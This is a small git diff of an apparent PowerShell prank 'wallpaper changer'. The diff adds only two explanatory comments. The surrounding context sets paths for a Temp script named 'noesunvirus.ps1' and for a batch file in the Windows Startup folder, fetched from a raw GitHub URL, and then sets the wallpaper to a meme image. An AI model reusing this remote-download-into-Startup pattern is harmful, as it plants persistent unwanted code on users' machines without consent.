@@ -4,6 +4,7 @@ $scriptPath1 = "$env:userprofile\AppData\Local\Temp\noesunvirus.ps1"
 $batFilePath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\start.bat"
 $batchUrl = "https://raw.githubusercontent.com/notthecoolguyyouknow/WallpaperChanger/main/start.bat"
 
+# This is for changing the wallpaper at x time (x=delayHours), if false doesn't wait and does at start.
 $startDelayEnabled = $false
 $delayHours = 3
 
@@ -26,6 +27,7 @@ if ($startDelayEnabled -eq $true) {
     Start-Sleep -Seconds ($delayHours * 3600)
 }
 
+# You can change these variables (imagePath and imageUrl) for different image and path of the image on the local computer.
 $imagePath = "$env:userprofile\Pictures\background.jpg"
 $imageUrl = "https://i.kym-cdn.com/editorials/icons/mobile/000/009/963/evil_jonkler.jpg"
 
